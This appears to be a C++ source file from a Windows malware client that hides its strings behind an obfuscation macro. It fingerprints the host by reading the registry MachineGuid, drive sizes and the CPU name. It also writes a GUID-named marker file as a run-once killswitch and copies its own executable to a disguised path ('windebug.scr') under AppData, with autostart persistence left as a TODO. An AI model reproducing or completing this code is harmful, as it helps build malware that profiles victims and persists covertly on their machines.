#include <kitty/system.h>
#include <adv/MetaString.h>
#include <intrin.h>
#include <iostream>
#include <vector>
#include <string>
#include <regex>
#include <filesystem>

LSTATUS GetMachineGuid(LPSTR guid)
{
	HKEY hKey{};
	LSTATUS status;

	status = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		OBFUSCATED("SOFTWARE\\Microsoft\\Cryptography"),
		0,
		KEY_QUERY_VALUE,
		&hKey
	);

	if (status != ERROR_SUCCESS)
		return status;

	DWORD cbData = 64;

	status = RegGetValueA(hKey, NULL, OBFUSCATED("MachineGuid"), RRF_RT_REG_SZ, NULL, guid, &cbData);

	if (status != ERROR_SUCCESS)
		return status;

	return status;
}

std::vector<std::string> GetAvailableDrives()
{
	std::vector<std::string> drives{};

	char lpBuffer[MAX_PATH];
	DWORD dwResult = GetLogicalDriveStringsA(MAX_PATH, lpBuffer);

	if (dwResult > 0 && dwResult <= MAX_PATH)
	{
		char* szSingleDrive = lpBuffer;

		while (*szSingleDrive)
		{
			ULARGE_INTEGER lpTotalNumberOfBytes;
			ULARGE_INTEGER lpTotalNumberOfFreeBytes;

			if (!GetDiskFreeSpaceEx(szSingleDrive, nullptr, &lpTotalNumberOfBytes, &lpTotalNumberOfFreeBytes))
				continue;

			std::string drive;
			drive += szSingleDrive;
			drive += OBFUSCATED(";");
			drive += std::to_string(lpTotalNumberOfBytes.QuadPart / 1048576);
			drive += OBFUSCATED(";");
			drive += std::to_string(lpTotalNumberOfFreeBytes.QuadPart / 1048576);

			drives.emplace_back(drive);

			szSingleDrive += strlen(szSingleDrive) + 1;
		}
	}

	return drives;
}

std::string GetProcessorName()
{
	int CPUInfo[4] = { -1 };
	char CPUBrandString[0x40];
	__cpuid(CPUInfo, 0x80000000);
	unsigned int nExIds = CPUInfo[0];

	memset(CPUBrandString, 0, sizeof(CPUBrandString));

	// Get the information associated with each extended ID.
	for (unsigned int i = 0x80000000; i <= nExIds; ++i)
	{
		__cpuid(CPUInfo, i);
		// Interpret CPU brand string.
		if (i == 0x80000002)
			memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
		else if (i == 0x80000003)
			memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
		else if (i == 0x80000004)
			memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
	}

	std::string cpuName = std::regex_replace(CPUBrandString, std::regex(" +$"), "");

	return cpuName;
}

bool CheckKillswitch()
{
	char guid[64];
	GetMachineGuid(guid);

	std::string userProfile = getenv(OBFUSCATED("USERPROFILE"));
	userProfile += OBFUSCATED("\\AppData\\Roaming\\Microsoft\\");
	userProfile += guid;

	if (!std::filesystem::exists(userProfile))
	{
		FILE* fp = fopen(userProfile.c_str(), OBFUSCATED("wb"));
		fclose(fp);

		return false;
	}

	return true;
}

bool AddToAutostart()
{
	// Copy file to hidden place
	char lpFilename[MAX_PATH];
	if (GetModuleFileNameA(nullptr, lpFilename, MAX_PATH) == 0)
		return false;

	std::string newPath = getenv(OBFUSCATED("USERPROFILE"));
	newPath += OBFUSCATED("\\AppData\\Local\\Microsoft\\Windows\\windebug.scr");
	
	if (!std::filesystem::copy_file(lpFilename, newPath))
		return false;

	// TODO: Add to autostart

	return true;
}